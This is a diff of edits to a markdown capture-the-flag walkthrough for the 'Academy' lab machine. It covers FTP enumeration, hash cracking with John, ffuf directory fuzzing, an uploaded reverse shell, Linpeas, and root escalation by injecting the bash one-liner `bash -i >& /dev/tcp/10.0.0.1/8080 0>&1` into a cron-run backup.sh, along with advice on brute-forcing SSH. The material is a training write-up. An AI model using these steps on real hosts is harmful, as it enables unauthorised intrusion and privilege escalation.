@@ -47,9 +47,9 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 We have 3 ports open, `ftp` on port 21 which contains a `note.txt` file (interesting), `ssh` on 22 and a webserver on 80. 
 
-NOTE: Normally during CTFs. SSH is ignored during enumeration unless valid credentials such as a username has been found. From that we can start brute forcing to find a valid password. You can try to brute force ssh by using root as a username then test to see if it has weak credentials. Another use case is to check if you can bypass detection after several brute force attempts. These are security risks that should be taken note of.
+NOTE: Normally during CTFs. SSH is ignored during enumeration unless valid credentials such as a username has been found. From that we can start brute forcing to find a valid password. We can try to brute force ssh by using root as a username then test to see if it has weak credentials. Another use case is to check if we can bypass detection after several brute force attempts. These are security risks that should be taken note of.
 
-Accessing the webserver on a browser leads us to a Apache2 default page. We will try find what other pages are hiding behind the default page later.
+Accessing the webserver on a browser leads us to a Apache2 default page.
 
 Next let’s try checking out the ftp server using the following command, `ftp <MACHINE IP>`
 
@@ -110,7 +110,7 @@ We can identify the type of hash using the `hash-identifier` command (it’s MD5
 
 Next lets try to crack the hash using `johntheripper`.  It’s a good idea to save the hash in a hash file (hash.txt or something).
 
-We can install `johntheripper` using `apt install John`
+We can install `johntheripper` using `apt install john`
 
 Lets get crackin’
 
@@ -133,7 +133,7 @@ Great. Now let’s find a page to use our credentials on.
 
 Let’s use a tool called `ffuf` to look for additional directories on the webserver.
 
-Use the following command: `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u [http://<MACHINE IP>/FUZZ](http://10.0.2.5/FUZZ)`
+Use the following command: `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<MACHINE IP>/FUZZ`
 
 Seems like we found an interesting directory `/academy` . Access it through the browser at `http://<MACHINE IP>/academy`
 
@@ -155,7 +155,7 @@ Go back to the profile page and upload our reverse shell:
 
 ![revshell](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/262aefde-4f50-4489-a4a7-ad32704d3e0b)
 
-Click `Update` , go back to our netcat listener and boom! We popped yet another shell!
+Click `Update` , go back to our netcat listener and boom! We popped a shell!
 
 ```bash
 ──(kali㉿kali)-[~]
@@ -177,7 +177,7 @@ $ locate sudo
 /bin/sh: 4: locate: not found
 ```
 
-So we got a shell, as an unprivileged user (AKA not root). Next thing to do is to find a way to elevate our privileges, and here comes a handy little script called [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) which allows us to search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
+So we got a shell as an unprivileged user (AKA not root). Next thing to do is to find a way to elevate our privileges, and here comes a handy little script called [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) which allows us to search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.
 
 Follow the instructions in the repo and download it onto the Kali machine.
 
@@ -226,7 +226,7 @@ After a while, Linpeas will provide us with a lot of information. Feel free to g
 
 ![backup sh](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/c2b600ef-2077-4780-8478-6bd99bed954c)
 
-Interesting…a `[backup.sh](http://backup.sh)` file is a win most of the time.
+Interesting…a `[backup.sh](http://backup.sh)` script.
 
 And…
 
@@ -268,7 +268,7 @@ permitted by applicable law.
 Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
 ```
 
-Nice. It worked. Now let’s try and move to the directory of the `[backup.sh](http://backup.sh)` file from the Linpeas results.
+Nice. It worked. Now let’s try and move to the directory of the `backup.sh` script from the Linpeas results.
 
 ```bash
 grimmie@academy:~$ cd /home/grimmie
@@ -301,7 +301,7 @@ grimmie@academy:~$ ps
   754 pts/0    00:00:00 ps
 ```
 
-Seems like the [backup.sh](http://backup.sh) is set to  a zip file `/tmp/backup.zip` from the directory `/var/html/academy/includes` and then changes the file’s permission.
+Seems like the `backup.sh` is set to  a zip file `/tmp/backup.zip` from the directory `/var/html/academy/includes` and then changes the file’s permission.
 
 This backup script is set to execute at set intervals (minutes, hours, days) but we don’t know. We can try a variety of methods to get this information such as using the `crontab` command to see what cronjobs are running. A cronjob is a Linux command used for scheduling tasks to be executed in the future. Some of these tasks run with root permissions and can be used to escalate privileges. Sadly we don’t have those here.
 
@@ -333,7 +333,7 @@ Wait for it to run till we see some information on `backup.sh`
 
 ![grimmie_process](https://github.com/w1zzl3-06/TCM-Practical-Ethical-Hacking-Notes/assets/141921425/e08afd60-1c3e-46ee-b1d3-794c16ec938e)
 
-Looks like the `[backup.sh](http://backup.sh)` seems to be executing at one minute intervals.
+Looks like the `backup.sh` seems to be executing at one minute intervals.
 
 Lets try to exploit this.
 
@@ -341,7 +341,7 @@ Google `bash reverse shell one liner`. First result should be this site: [https:
 
 Copy this line: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
 
-If we put this line into the `[backup.sh](http://backup.sh)` file. The next time it executes, we will get a reverse shell as root!!
+If we put this line into the `backup.sh` file. The next time it executes, we will get a reverse shell as root!!
 
 NOTE: Make sure to change the `10.0.0.1` in the one liner to our Kali IP. We can leave the port `8080` as is.
 
